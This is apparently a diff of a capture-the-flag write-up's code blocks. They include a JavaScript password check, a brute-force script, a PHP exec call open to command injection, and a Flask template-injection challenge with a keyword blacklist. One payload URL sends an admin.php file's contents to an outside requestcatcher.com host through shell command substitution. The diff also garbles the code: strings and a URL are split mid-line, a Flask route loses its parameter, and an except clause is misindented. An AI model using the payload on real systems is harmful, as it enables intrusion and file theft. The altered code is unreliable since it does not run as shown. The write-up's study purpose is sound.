@@ -68,39 +68,19 @@ Dim x51 As String
 ErrorHandler:
  MsgBox "hWgjD9NKf7UqXdAq0GBb", vbCritical, "uv9b"
 End Sub
-```
-
-
-
-```
 x49 = [char]0x50 + [char]0x43 + [char]0x54 + [char]0x46 + [char]0x7B + [char]0x33 + [char]0x6E + [char]0x34 + [char]0x62 + [char]0x6C + [char]0x33 + [char]0x5F + [char]0x6D + [char]0x34 + [char]0x63 + [char]0x72 + [char]0x30 + [char]0x35 + [char]0x5F + [char]0x70 + [char]0x6C + [char]0x7A + [char]0x5F + [char]0x32 + [char]0x37 + [char]0x33 + [char]0x31 + [char]0x35 + [char]0x36 + [char]0x37 + [char]0x30 + [char]0x7D
-```
-
-
-
-```
-$ binwalk -e capybara.jpeg 
+$ binwalk -e capybara.jpeg
 
 DECIMAL HEXADECIMAL DESCRIPTION
 --------------------------------------------------------------------------------
 0 0x0 JPEG image data, JFIF standard 1.01
 151174 0x24E86 Zip archive data, at least v2.0 to extract, compressed size: 6902, uncompressed size: 919160, name: audio.wav
 158170 0x269DA End of Zip archive, footer length: 22
-```
-
-
-
-```
 function checkName(name){
 
  var check = name.split("").reverse().join("");
  return check === "uyjnimda" ? !0 : !1;
 }
-```
-
-
-
-```
 function checkLength(pwd){
  return (password.length % 6 === 0 )? !0:!1;
  }
@@ -113,26 +93,17 @@ function checkValidity(password){
 
  let sum = 0;
  for (let i = 0; i < arr.length; i+=6){
- var add = arr[i] & arr[i + 2]; 
- var or = arr[i + 1] | arr[i + 4]; 
+ var add = arr[i] & arr[i + 2];
+ var or = arr[i + 1] | arr[i + 4];
  var xor = arr[i + 3] ^ arr[i + 5];
- if (add === 0x60 && or === 0x61 && xor === 0x6) sum += add + or - xor; 
+ if (add === 0x60 && or === 0x61 && xor === 0x6) sum += add + or - xor;
  }
  return sum === 0xbb ? !0 : !1;
 }
-```
-
-
-
-```
-$ python3 -c "print(0x60+0x61-0x6);print(0xbb)"
+$ python3 -c "print(0x60+0x61-0x6);
+print(0xbb)"
 187
 187
-```
-
-
-
-```
 import time
 import requests
 
@@ -145,38 +116,20 @@ for v0 in range(97,122 + 1):
  if (v0 & v2) == 0x60 and (v1 | v4) == 0x61 and (v3 ^ v5) == 0x6:
  passwd = chr(v0) + chr(v1) + chr(v2) + chr(v3) + chr(v4) + chr(v5)
  print(passwd)
- t = requests.post('http://chal.pctf.competitivecyber.club:9096/check.php', data={'password':passwd}).text
+ t = requests.post('http://chal.pctf.competitivecyber.club:
+9096/check.php', data={'password':
+passwd}).text
  if 'incorrect password' not in t:
  print(t)
  print('did it!')
  exit(0)
  time.sleep(0.1)
-```
-
-
-
-```
 exec("php ../scripts/send_pass.php " . $this->tmpPass . " " . $this->wh . " > /dev/null 2>&1 &");
-```
-
-
-
-```
 if (!filter_var($this->wh, FILTER_VALIDATE_URL)) {
  header("location: ../login.php?error=NotValidWebhook");
  exit();
  }
-```
-
-
-
-```
 http://[yours].requestcatcher.com/test?q=$(dd${IFS}if=/var/www/html/admin.php${IFS}bs=1${IFS}skip=325)
-```
-
-
-
-```
 []
 config
 |
@@ -184,11 +137,6 @@ __builtins__
 "
 '
 +
-```
-
-
-
-```
 from flask import Flask, render_template, render_template_string
 
 app = Flask(__name__)
@@ -226,7 +174,7 @@ starter_pokemon = {
 
 def blacklist(string):
  block = ["config", "update", "builtins", "\"", "'", "`", "|", " ", "[", "]", "+", "-"]
- 
+
  for item in block:
  if item in string:
  return True
@@ -237,16 +185,17 @@ def index():
  render = render_template('index.html')
  return render_template_string(render)
 
-@app.route('/<pokemon>')
+@app.route('/')
 def detail(pokemon):
  pokemon = pokemon.lower()
  try:
  render = render_template('pokemon_name.html', data=starter_pokemon[pokemon])
  return render_template_string(render)
- except:
+ 
+except:
  if blacklist(pokemon):
  return render_template('error.html')
- 
+
  render = render_template('404.html', pokemon=pokemon)
  return render_template_string(render)
 
